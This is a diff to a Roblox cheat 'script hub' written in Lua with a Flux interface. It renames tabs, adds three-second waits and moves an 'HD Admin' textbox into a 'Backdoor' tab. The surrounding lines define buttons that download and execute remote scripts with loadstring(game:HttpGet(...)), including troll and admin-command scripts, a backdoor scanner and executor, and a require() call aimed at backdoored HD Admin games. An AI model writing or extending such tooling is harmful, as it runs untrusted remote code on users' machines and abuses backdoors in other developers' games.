@@ -781,7 +781,7 @@ Flux:Notification("Do you want execute?", "Okay!")
 loadstring(game:HttpGet("https://raw.githubusercontent.com/voiddscripts/moon/main/script.lua"))()
 end)
 
-local cc = win:Tab("GUIS", "http://www.roblox.com/asset/?id=6022668888")
+local cc = win:Tab("Guis", "http://www.roblox.com/asset/?id=6022668888")
 
 cc:Label("GUIS FE & Clients")
 cc:Button("R15 >> R6", "Maybe worked..", function()
@@ -885,7 +885,7 @@ Flux:Notification("Do you want execute?", "Okay!")
 loadstring(game:HttpGet("https://raw.githubusercontent.com/advxzivhsjjdhxhsidifvsh/mobkeyboard/main/main.txt", true))()
 end)
 
-local gg = win:Tab("ADMIN", "http://www.roblox.com/asset/?id=6022668888")
+local gg = win:Tab("Admin", "http://www.roblox.com/asset/?id=6022668888")
 
 gg:Label("Admins Command")
 
@@ -910,7 +910,7 @@ Flux:Notification("Do you want execute?", "Okay!")
 loadstring(game:HttpGet("https://raw.githubusercontent.com/CMD-X/CMD-X/master/Source",true))()
 end)
 
-local nn = win:Tab("UTG", "http://www.roblox.com/asset/?id=6022668888")
+local nn = win:Tab("Ultimate", "http://www.roblox.com/asset/?id=6022668888")
 
 nn:Label("Trolls or Something")
 nn:Button("Troll [?]", "Troll Or For Games!", function()
@@ -941,10 +941,12 @@ local ii = win:Tab("Backdoor", "http://www.roblox.com/asset/?id=6022668888")
 ii:Label("Executor Backdoor")
 ii:Button("Executor FraktureSS", "Troll Commands Games!", function()
 Flux:Notification("Do you want execute?", "Okay!")
+wait(3.0)
 loadstring(game:HttpGet("https://raw.githubusercontent.com/L1ghtingBolt/FraktureSS/master/unobfuscated.lua"))()
 end)
 ii:Button("Executor", "Troll Commands Games!", function()
 Flux:Notification("Do you want execute?", "Okay!")
+wait(3.0)
 --[[
     backdoor.exe, the best backdoor scanner in Roblox.
     Copyright (C) 2021	iK4oS
@@ -1078,7 +1080,8 @@ end
 end)
 ii:Line()
 ii:Label("HD Admin Backdoor")
-nn:Textbox("HD Admin", "Enter your username", function(v)
+ii:Textbox("HD Admin", "Enter your username", function(v)
 Flux:Notification("Do you want execute?", "Okay!")
+wait(3.0)
 require(11560761226).HD("v")
 end)
